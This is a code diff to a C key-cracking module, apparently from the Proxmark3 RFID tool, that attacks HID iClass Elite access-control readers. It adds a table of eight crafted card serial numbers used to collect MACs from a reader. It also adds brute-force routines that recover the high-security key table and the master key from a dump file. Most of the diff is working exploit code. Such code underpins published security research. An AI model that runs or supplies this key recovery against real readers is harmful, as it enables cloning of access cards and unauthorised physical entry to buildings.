@@ -4,38 +4,48 @@
 #include <cipherutils.h>
 #include <stdio.h>
 #include <time.h>
-#include "key_attack.h"
 #include "cipher.h"
 #include "ikeys.h"
 #include "elite_crack.h"
 #include "fileutils.h"
 #include "des.h"
+
+iclass_attack attack_data[8] = {
+	{ {0x00,0x0B,0x0F,0xFF,0xF7,0xFF,0x12,0xE0} , {0x01,0x01,0x00,0x00,0x45,0x01,0x45,0x45 } ,{0,1 }},
+	{ {0x00,0x13,0x94,0x7e,0x76,0xff,0x12,0xe0} , {0x02,0x0c,0x01,0x00,0x45,0x01,0x45,0x45} , {2,12}},
+	{ {0x2a,0x99,0xac,0x79,0xec,0xff,0x12,0xe0} , {0x07,0x45,0x0b,0x00,0x45,0x01,0x45,0x45} , {7,11}},
+	{ {0x17,0x12,0x01,0xfd,0xf7,0xff,0x12,0xe0} , {0x03,0x0f,0x00,0x00,0x45,0x01,0x45,0x45} , {3,15}},
+	{ {0xcd,0x56,0x01,0x7c,0x6f,0xff,0x12,0xe0} , {0x04,0x00,0x08,0x00,0x45,0x01,0x45,0x45} , {4,8}},
+	{ {0x4b,0x5e,0x0b,0x72,0xef,0xff,0x12,0xe0} , {0x0e,0x06,0x08,0x00,0x45,0x01,0x45,0x45} , {6,14}},
+	{ {0x00,0x73,0xd8,0x75,0x58,0xff,0x12,0xe0} , {0x0b,0x09,0x0f,0x00,0x45,0x01,0x05,0x45} , {9,5}},
+	{ {0x0c,0x90,0x32,0xf3,0x5d,0xff,0x12,0xe0} , {0x0d,0x0f,0x0a,0x00,0x45,0x01,0x05,0x45} , {10,13}},
+};
+
+
 /**
  * @brief Permutes a key from standard NIST format to Iclass specific format
+ *	from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220
+ *
+ *	If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.
+ *
+ * 	1 0 1 1 1 1 1 1  bf
+ *	0 0 0 0 0 0 0 1  01
+ *	0 0 1 0 1 1 0 1  2d
+ *	0 0 1 0 1 0 1 0  2a
+ *	1 1 1 1 1 0 0 1  f9
+ *	0 1 0 0 0 1 0 0  44
+ *	1 0 0 0 1 1 0 1  8d
+ *	0 1 1 0 1 1 0 0  6c
+ *
+ *	8 0 b 8 b a 9 e
+ *	a d 9 8 b 7 0 a
+ *
  * @param key
  * @param dest
  */
 void permutekey(uint8_t key[8], uint8_t dest[8])
 {
 
-	/**
-	from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220
-
-	If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.
-
-	1 0 1 1 1 1 1 1  bf
-	0 0 0 0 0 0 0 1  01
-	0 0 1 0 1 1 0 1  2d
-	0 0 1 0 1 0 1 0  2a
-	1 1 1 1 1 0 0 1  f9
-	0 1 0 0 0 1 0 0  44
-	1 0 0 0 1 1 0 1  8d
-	0 1 1 0 1 1 0 0  6c
-
-	8 0 b 8 b a 9 e
-	a d 9 8 b 7 0 a
-
-	**/
 	int i;
 	for(i = 0 ; i < 8 ; i++)
 	{
@@ -83,26 +93,15 @@ void permutekey_rev(uint8_t key[8], uint8_t dest[8])
  * @param i the number to read. Should be less than 127, or something is wrong...
  * @return
  */
-int _readFromDump(uint8_t dump[], uint8_t cc_nr[], uint8_t csn[], uint8_t received_mac[], int i)
+int _readFromDump(uint8_t dump[], uint8_t cc_nr[], uint8_t csn[], uint8_t received_mac[], uint8_t i)
 {
-	if(i  > 127){
-		PrintAndLog("Error, i > 127, bad things will happen... ");
+	if(i  > 8){
+		PrintAndLog("Error, only eight malicious CSNs used here");
 		return 1;
 	}
 
-	uint8_t key_index[] = {0};
-
-	iclass_attack attack = get_attack_data(i);
-	memcpy(csn, attack.simulated_csn, 8);
-	memcpy(key_index, attack.key_indices, 8);
-	if(memcmp(csn, dump+i*16, 8) != 0)
-	{
-		PrintAndLog("Something is wrong. \nExpected CSN: %02x%02x%02x%02x%02x%02x%02x%02x\nFound CSN:   %02x%02x%02x%02x%02x%02x%02x%02x",
-				csn[0],csn[1], csn[2],csn[3],csn[4],csn[5], csn[6],csn[7],
-				dump[i*16],	dump[i*16+1],dump[i*16+2],dump[i*16+3],
-				dump[i*16+4],dump[i*16+5],dump[i*16+6],dump[i*16+7]);
-		return 1;
-	}
+	memcpy(csn, dump+i*16, 8);
+	memset(cc_nr, 0,12);
 	// Load NR (cc is eight zeroes)
 	cc_nr[8] = *(dump+i*16+8);
 	cc_nr[9] = *(dump+i*16+8+1);
@@ -111,7 +110,16 @@ int _readFromDump(uint8_t dump[], uint8_t cc_nr[], uint8_t csn[], uint8_t receiv
 
 	// Load MAC
 	memcpy(received_mac, dump+i*16+12, 4);
-	if(false)
+
+	if(memcmp(attack_data[i].simulated_csn, csn, 8) != 0)
+	{
+		PrintAndLog("Something is wrong:");
+		printvar("Expected CSN",attack_data[i].simulated_csn,8);
+		printvar("Found CSN   ",csn,8);
+		return 1;
+	}
+
+	if(true)
 	{
 		printvar("csn", csn,8);
 		printvar("cc_nr", cc_nr,12);
@@ -169,6 +177,7 @@ int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4
 	uint8_t b0 = 0, b1 =0 ,b45 =0;
 	b0=0x00;
 	//b0=241;
+	b0=0xdf;
 	int dbg = 0;
 	/**
 	  Debug run:
@@ -228,23 +237,20 @@ int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4
 
 	return 1;
 }
-
 /**
- * @brief Performs brute force attack against the remaining 126 bytes after the initial 2^24-attack has
- * recovered three bytes already. This attack runs considerably faster; 126 * 256 (max) diversify+MAC
+ * @brief Performs brute force attack against the remaining 14 bytes after the initial 2^24-attack has
+ * recovered three bytes already. This attack runs considerably faster; 7 * 256*256 (max) diversify+MAC
  * calculations.
  * @param dump The dumpdata from iclass reader attack.
  * @param keytable where to write found values.
  * @return
  */
-int bruteforceRemaining(uint8_t dump[], uint8_t keytable[])
+int bruteforceTwobytes(uint8_t dump[], uint8_t keytable[])
 {
-
-
-	int i;
+	int errors = 0;
+	uint8_t i;
 	uint8_t csn[8] = { 0 };
 	uint8_t *key_index;
-	uint8_t recovery_byte = 0;
 	uint8_t key_sel_p[8] = { 0 };
 	uint8_t div_key[8] = {0};
 	int found = false;
@@ -252,61 +258,58 @@ int bruteforceRemaining(uint8_t dump[], uint8_t keytable[])
 	uint8_t received_mac[4] = {0};
 	uint8_t key_sel[8] = {0};
 	uint8_t calculated_MAC[4] = { 0 };
+	int x,y;
 	// We start at index 1!! At zero is the three-byte attack
-	for(i =1 ; i <= 125; i++)
+	for(i =1 ; i < 8; i++)
 	{
-
 		_readFromDump(dump, cc_nr, csn, received_mac, i);
-		iclass_attack attack_data = get_attack_data(i);
-		recovery_byte = attack_data.recovered_keybyte;
-		key_index = attack_data.key_indices;
 
-		uint8_t b = 0;
+		key_index = attack_data[i].key_indices;
+		x=0;
+		do {
+			//Set the byte 1 to recover to x
+			keytable[attack_data[i].recovered_keybytes[0]] = x;
+			y=0;
+			do {
+				//Set the byte 2 to recover to y
+				keytable[attack_data[i].recovered_keybytes[1]] = y;
+				// Piece together the key
+				key_sel[0] = keytable[key_index[0]];key_sel[1] = keytable[key_index[1]];
+				key_sel[2] = keytable[key_index[2]];key_sel[3] = keytable[key_index[3]];
+				key_sel[4] = keytable[key_index[4]];key_sel[5] = keytable[key_index[5]];
+				key_sel[6] = keytable[key_index[6]];key_sel[7] = keytable[key_index[7]];
 
-		do{
-			//Set the byte to recover to b
-			keytable[attack_data.recovered_keybyte] = b;
+				//Permute from iclass format to standard format
+				permutekey_rev(key_sel,key_sel_p);
+				//Diversify
+				diversifyKey(csn, key_sel_p, div_key);
+				//Calc mac
+				doMAC(cc_nr, div_key,calculated_MAC);
+				if(memcmp(calculated_MAC, received_mac, 4) == 0)
+				{
 
-			// The indices points to where to fetch data from the keytable from
-			//Take values from keytable and place into our key
-			key_sel[0] = keytable[key_index[0]];
-			key_sel[1] = keytable[key_index[1]];
-			key_sel[2] = keytable[key_index[2]];
-			key_sel[3] = keytable[key_index[3]];
-			key_sel[4] = keytable[key_index[4]];
-			key_sel[5] = keytable[key_index[5]];
-			key_sel[6] = keytable[key_index[6]];
-			key_sel[7] = keytable[key_index[7]];
+					PrintAndLog("[0x%02x:0x%02x][0x%02x:0x%02x]"
+								,attack_data[i].recovered_keybytes[0],x
+								,attack_data[i].recovered_keybytes[1],y);
+					found = true;
+					break;
+				}
 
-			//Permute from iclass format to standard format
-			permutekey_rev(key_sel,key_sel_p);
-			//Diversify
-			diversifyKey(csn, key_sel_p, div_key);
-			//Calc mac
-			doMAC(cc_nr, div_key,calculated_MAC);
-			if(false)
-			{
-				printvar("keysel",key_sel,8);
-				printvar("[0x59]MAC",calculated_MAC,4);
-			}
-			if(memcmp(calculated_MAC, received_mac, 4) == 0)
-			{
-				PrintAndLog("[0x%02x:0x%02x]", recovery_byte, b);
-				found = true;
-				break;
-			}
-		}while(b++ != 255);
+			}while(y++ != 255 && found == 0);
+		}while(x++ != 255 && found==0);
 
 		if(! found)
 		{
-			PrintAndLog("Failed to recover byte 0x%02x", recovery_byte);
-			return 1;
+			PrintAndLog("Failed to recover bytes 0x%02x and 0x%02x"
+						,attack_data[i].recovered_keybytes[0]
+						,attack_data[i].recovered_keybytes[1]);
+			errors++;
 		}
 		found = false;
 	}
-	saveFile("iclass_keytable_dump", "bin", keytable, 128);
-	return 0;
+	return errors;
 }
+
 /**
  * From dismantling iclass-paper:
  *	Assume that an adversary somehow learns the first 16 bytes of hash2(K_cus ), i.e., y [0] and z [0] .
@@ -373,6 +376,106 @@ int calculateMasterKey(uint8_t keytable[], uint64_t master_key[] )
 	return 0;
 }
 
+int verifyAndReorder(uint8_t dump[])
+{
+	uint8_t newdump[128*16];
+	uint8_t csn[8] = {0};
+	uint8_t cc_nr[8] = {0};
+	uint8_t received_mac[8] = {0};
+	int error = 0;
+	int was_ok = 1;
+	uint8_t i;
+	for(i = 0; i < 8; i++)
+	{
+		iclass_attack attack = attack_data[i];
+		if(_readFromDump(dump, cc_nr, csn, received_mac, i))
+		{
+			int j;
+			int found = 0;
+			//Wrong order, search for it
+			for(j =0 ; j < 126; j++)
+			{
+				if(memcmp(attack.simulated_csn, dump+j*16,8)== 0)
+				{// Found it
+					memcpy(newdump+i*16, dump+j*16,16);
+					PrintAndLog("Reordered CSN");
+					printvar("CSN", attack.simulated_csn,8);
+					found = 1;
+					was_ok = 0;
+					break;
+				}
+			}
+			if(!found)
+			{
+				PrintAndLog("Missing attack-CSN!");
+				printvar("CSN",attack.simulated_csn,8);
+				error += 1;
+			}
+		}else
+		{
+			memcpy(newdump+i*16, dump+i*16,16);
+		}
+	}
+	if(!was_ok)
+	{
+		saveFile("iclass_dump_reordered","bin",newdump,sizeof(newdump));
+	}
+	memcpy(dump, newdump,sizeof(newdump));
+	return error;
+}
+
+int bruteforceFile(const char *filename, int verify)
+{
+	int errors = 0;
+	uint8_t keytable[128] = {0};
+	uint8_t dump[128*(8+4+4)] = {0};
+	if( loadFile(filename, dump, sizeof(dump)))
+	{
+		PrintAndLog("Failed to load dump-file (%s)" , filename);
+		return 1;
+	}
+	PrintAndLog("[+] Loaded dump file %s", filename);
+	if(verify)
+		verifyAndReorder(dump);
+
+	clock_t t1 = clock();
+	errors += bruteforceThreeBytes(dump,keytable);
+	errors += bruteforceTwobytes(dump, keytable);
+	clock_t t2 = clock();
+	float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
+	PrintAndLog("\nPerformed full crack in %f seconds",diff);
+	printarr_human_readable("High Security Key Table (a.k.a Hash2)", keytable, 128);
+
+	errors += calculateMasterKey(keytable, NULL);
+
+	return errors;
+}
+int bruteforceFile2(const char *filename, int verify)
+{
+	int errors = 0;
+	uint8_t keytable[128] = {0};
+	uint8_t dump[8*(8+4+4)] = {0};
+	if( loadFile(filename, dump, sizeof(dump)))
+	{
+		PrintAndLog("Failed to load dump-file (%s)" , filename);
+		return 1;
+	}
+	PrintAndLog("[+] Loaded dump file %s", filename);
+	if(verify)
+		verifyAndReorder(dump);
+
+	clock_t t1 = clock();
+	errors += bruteforceThreeBytes(dump,keytable);
+	errors += bruteforceTwobytes(dump, keytable);
+	clock_t t2 = clock();
+	float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
+	PrintAndLog("\nPerformed full crack in %f seconds",diff);
+
+	errors += calculateMasterKey(keytable, NULL);
+
+	return errors;
+}
+
 // ---------------------------------------------------------------------------------
 // ALL CODE BELOW THIS LINE IS PURELY TESTING
 // ---------------------------------------------------------------------------------
@@ -428,7 +531,7 @@ int _testBruteforce()
 		PrintAndLog("[+] Loaded dump file %s", filename);
 		clock_t t1 = clock();
 		bruteforceThreeBytes(dump,keytable);
-		bruteforceRemaining(dump, keytable);
+		bruteforceTwobytes(dump, keytable);
 		clock_t t2 = clock();
 		float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
 		PrintAndLog("\nPerformed full crack in %f seconds",diff);
